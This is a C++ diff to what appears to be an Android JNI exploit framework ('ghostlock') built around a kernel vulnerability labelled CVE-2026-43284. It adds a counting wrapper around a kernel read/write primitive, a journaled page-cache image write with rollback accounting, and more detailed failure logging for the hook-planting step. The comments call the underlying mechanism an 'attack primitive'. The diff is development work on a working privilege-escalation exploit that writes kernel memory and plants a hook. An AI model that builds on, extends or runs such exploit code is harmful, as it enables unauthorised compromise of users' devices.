@@ -27,12 +27,14 @@
 #include <unistd.h>
 #include <string>
 #include <utility>
+#include <vector>
 
 #include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
 #include "backend/cve_2026_43284/hook/sentry_hook.hpp"
 #include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
+#include "backend/cve_2026_43284/steps/pagecache_step_runner.hpp"
 #include "backend/cve_2026_43284/access_params.hpp"
 #include "backend/cve_2026_43284/lkm/module_facts.hpp"
 #include "jni/api_43284.hpp"
@@ -121,6 +123,125 @@ namespace ghostlock::jni {
             out = std::move(filled);
             return true;
         }
+        /**
+         *  只记账的 access 转发器：每次调用原样交给真实 access，只额外数两件**已经发生**的事 ——
+         *  成功的写（written，整块写成功才计）与「同一偏移的读回与刚写的字节逐字节相同」（verified）。
+         *
+         *  为什么需要它：steps::write_hook 只返回 bool，不交账（pagecache_steps.hpp:139），而设备上
+         *  要看到钩子这一段写了几块、验了几块。它**不做判断、不额外读写、不改变任何返回值**，账只进
+         *  日志、不参与控制流，所以页来源与攻击原语一字未动。
+         *
+         *  偏移取自 AccessParams（与 write_image_verified / write_hook 设置 params->offset 的口径同一处）；
+         *  参数不是这一套时只转发、不计数。
+         */
+        class CountingAccess final : public ghostlock::contract::KernelAccess {
+          public:
+            /** @param inner 真实的 access（借用，必须活过本对象） */
+            explicit CountingAccess(ghostlock::contract::KernelAccess &inner) noexcept : inner_(inner) {}
+            CountingAccess(const CountingAccess &) = delete;
+            CountingAccess &operator=(const CountingAccess &) = delete;
+            ~CountingAccess() noexcept override = default;
+
+            [[nodiscard]] AccessState state(const ghostlock::contract::AccessChannel channel) const noexcept override {
+                return inner_.state(channel);
+            }
+            [[nodiscard]] bool supports(const ghostlock::contract::AccessChannel channel) const noexcept override {
+                return inner_.supports(channel);
+            }
+            [[nodiscard]] bool supports(const ghostlock::contract::AccessCarrier carrier) const noexcept override {
+                return inner_.supports(carrier);
+            }
+            [[nodiscard]] bool supports_width(const std::size_t bytes) const noexcept override {
+                return inner_.supports_width(bytes);
+            }
+            [[nodiscard]] AccessResult<bool> initialize(const AccessMiscParameters &parameters) noexcept override {
+                return inner_.initialize(parameters);
+            }
+            [[nodiscard]] AccessResult<bool> shutdown() noexcept override { return inner_.shutdown(); }
+
+            [[nodiscard]] AccessResult<std::span<const std::byte>> read(
+                    const std::uint64_t address, const std::size_t bytes,
+                    const ghostlock::contract::AccessChannel channel,
+                    const AccessMiscParameters &parameters) noexcept override {
+                const auto got = inner_.read(address, bytes, channel, parameters);
+                if (got.ok() && got.value.size() == bytes) { note_read(parameters, got.value); }
+                return got;
+            }
+            [[nodiscard]] AccessResult<std::size_t> write(
+                    const std::uint64_t address, const std::span<const std::byte> in,
+                    const ghostlock::contract::AccessChannel channel,
+                    const AccessMiscParameters &parameters) noexcept override {
+                const auto wrote = inner_.write(address, in, channel, parameters);
+                if (wrote.ok() && wrote.value == in.size()) {
+                    ++written_;
+                    note_write(parameters, in);
+                }
+                return wrote;
+            }
+
+            /** @return 这一段整块写成功的次数。 */
+            [[nodiscard]] std::size_t written() const noexcept { return written_; }
+            /** @return 这一段「同偏移读回与刚写的字节相同」的次数。 */
+            [[nodiscard]] std::size_t verified() const noexcept { return verified_; }
+
+          private:
+            /** 一条记录最多记一块多少字节（钩子路径的块宽是 16；这里留到 64，与 write_hook 的块缓冲同界）。 */
+            static constexpr std::size_t kSlotBytes = 64U;
+            /** 最多记多少个不同偏移（载荷 ≤ 158 块 + 站点块；满了只停记账，不影响转发）。 */
+            static constexpr std::size_t kSlots = 192U;
+            struct Slot final {
+                std::uint64_t offset = 0U;
+                std::size_t bytes = 0U;
+                std::byte want[kSlotBytes] = {};
+            };
+
+            [[nodiscard]] Slot *find(const std::uint64_t offset) noexcept {
+                for (std::size_t i = 0U; i < slot_count_; ++i) {
+                    if (slots_[i].offset == offset) { return &slots_[i]; }
+                }
+                return nullptr;
+            }
+            [[nodiscard]] const Slot *find(const std::uint64_t offset) const noexcept {
+                for (std::size_t i = 0U; i < slot_count_; ++i) {
+                    if (slots_[i].offset == offset) { return &slots_[i]; }
+                }
+                return nullptr;
+            }
+            void note_write(const AccessMiscParameters &parameters,
+                            const std::span<const std::byte> in) noexcept {
+                const auto *const params =
+                        dynamic_cast<const backend::cve_2026_43284::AccessParams *>(&parameters);
+                if (params == nullptr || in.size() > kSlotBytes) { return; }
+                Slot *slot = find(params->offset);
+                if (slot == nullptr) {
+                    if (slot_count_ >= kSlots) { return; }
+                    slot = &slots_[slot_count_];
+                    slot->offset = params->offset;
+                    ++slot_count_;
+                }
+                slot->bytes = in.size();
+                for (std::size_t i = 0U; i < in.size(); ++i) { slot->want[i] = in[i]; }
+            }
+            void note_read(const AccessMiscParameters &parameters,
+                           const std::span<const std::byte> got) noexcept {
+                const auto *const params =
+                        dynamic_cast<const backend::cve_2026_43284::AccessParams *>(&parameters);
+                if (params == nullptr) { return; }
+                const Slot *const slot = find(params->offset);
+                if (slot == nullptr || slot->bytes != got.size()) { return; }
+                for (std::size_t i = 0U; i < slot->bytes; ++i) {
+                    if (slot->want[i] != got[i]) { return; }
+                }
+                ++verified_;
+            }
+
+            ghostlock::contract::KernelAccess &inner_;
+            Slot slots_[kSlots]{};
+            std::size_t slot_count_ = 0U;
+            std::size_t written_ = 0U;
+            std::size_t verified_ = 0U;
+        };
+
         /**
          *  按会话的落地装配：门 → 双门对象 → 拼接面 → 窗口 → 落地。
          *
@@ -1161,9 +1282,22 @@ namespace ghostlock::jni {
                     (surface_now != nullptr && surface_now->door_slot < kMaxDoors)
                         ? g_doors[surface_now->door_slot].fd : -1);
         }
+        /* journal：缓冲按块数算（blocks × width），是本次调用的局部 vector —— 生命周期在请求内，
+         * 容量与它同大。镜像写是这条链上唯一会留下半改状态的一步，所以账要跟着结果走。 */
+        std::vector<std::byte> journal(
+                backend::cve_2026_43284::steps::journal_bytes_for(request.image, request.width));
+        static char land_message[224] = {};
         const char *refusal = nullptr;
-        const bool wrote = backend::cve_2026_43284::steps::write_image_verified(request, &refusal);
+        const auto ledger = backend::cve_2026_43284::steps::write_image_journaled(
+                request, std::span<std::byte>(journal.data(), journal.size()), &refusal,
+                std::span<char>{});
+        const bool wrote = ledger.ok;
         GL_LOGI("write_image verified=%d refusal=%s", wrote ? 1 : 0, refusal != nullptr ? refusal : "(null)");
+        /* 这次的账（写了几块、验了几块、回滚了几块）：回滚有块写不回 ⇒ 行首带前缀，读日志的人不必去猜。 */
+        GL_LOGI("%swrite outcome: written=%zu verified=%zu rolled=%zu overflow=%d incomplete=%d",
+                ledger.outcome.rollback_incomplete ? "rollback-incomplete: " : "",
+                ledger.outcome.written, ledger.outcome.verified, ledger.outcome.blocks_rolled_back,
+                ledger.outcome.journal_overflow ? 1 : 0, ledger.outcome.rollback_incomplete ? 1 : 0);
         if (!wrote && why != nullptr) {
             /* 组帧层的错误码（20/21/22/23 = 前端 / splice / 长度 / 后缀；0 = 报文发出去了）：
              * 「报文到底发出去没有」只有它能回答，所以非零时优先报它。 */
@@ -1173,16 +1307,20 @@ namespace ghostlock::jni {
                                          : -1;
             GL_LOGI("write_image land: landing_slot=%zu splice_error=%d (0=dispatched, 20/21/22/23=splice stage)",
                     landing_slot, splice_error);
-            static char land_message[64] = {};
+            char base_text[224] = {};
             if (splice_error != 0) {
-                std::snprintf(land_message, sizeof(land_message), "land:splice-error-%d", splice_error);
-                *why = land_message;
+                std::snprintf(base_text, sizeof(base_text), "land:splice-error-%d", splice_error);
             } else if (refusal != nullptr) {
-                *why = refusal;  /* 组帧没问题 ⇒ 保留原来的 step-… 名字（问题在别处） */
+                /* 组帧没问题 ⇒ 保留原来的 step-… 名字（问题在别处）。 */
+                std::snprintf(base_text, sizeof(base_text), "%s", refusal);
             } else {
                 /* 组帧层没失败（0）且步骤层没给名 ⇒ 报文发出去了，问题在内核那一侧。 */
-                *why = "land:dispatched-unverified";
+                std::snprintf(base_text, sizeof(base_text), "%s", "land:dispatched-unverified");
             }
+            /* rollback_incomplete 也进拒绝串：上层只看 why 就能判「有块没救回来」。 */
+            std::snprintf(land_message, sizeof(land_message), "%s%s", base_text,
+                          ledger.outcome.rollback_incomplete ? ":rollback-incomplete" : "");
+            *why = land_message;
         }
         GL_LOGI("write_image -> %d why=%s", wrote ? 1 : 0,
                 (why != nullptr && *why != nullptr) ? *why : "(null)");
@@ -1241,7 +1379,10 @@ namespace ghostlock::jni {
         const backend::cve_2026_43284::hook::SentryPlan plan =
             backend::cve_2026_43284::hook::device_sentry_plan();
         backend::cve_2026_43284::steps::HookRequest request{};
-        request.access = g_accesses[slot].get();
+        /* 只计数、其余原样转发的 access：steps::write_hook 不交账，钩子这一段写了几块、验了几块
+         * 只能从调用面数出来（它不额外读写、不改变任何返回值，见 CountingAccess）。 */
+        CountingAccess counted(*g_accesses[slot]);
+        request.access = &counted;
         request.params = &access_params;
         request.plan = &plan;
         request.width = static_cast<std::uint64_t>(values.hookWidth);
@@ -1278,6 +1419,10 @@ namespace ghostlock::jni {
         GL_LOGI("hook: write_hook wrote=%d refusal=%s plan=%p width=%llu", hook_wrote ? 1 : 0,
                 refusal != nullptr ? refusal : "(null)", static_cast<const void *>(request.plan),
                 static_cast<unsigned long long>(request.width));
+        /* 钩子这一段的账：journal 三项恒 0 —— 钩子段没有 journal（参照实现也只回滚模块区），
+         * 所以没有可写回的旧块；written / verified 由上面那个只计数的转发器给出。 */
+        GL_LOGI("write outcome: written=%zu verified=%zu rolled=%zu overflow=%d incomplete=%d (hook: no journal)",
+                counted.written(), counted.verified(), static_cast<std::size_t>(0U), 0, 0);
         GL_LOGI("hook write -> %d refusal=%s", hook_wrote ? 1 : 0,
                 refusal != nullptr ? refusal : "(null)");
         return hook_wrote;
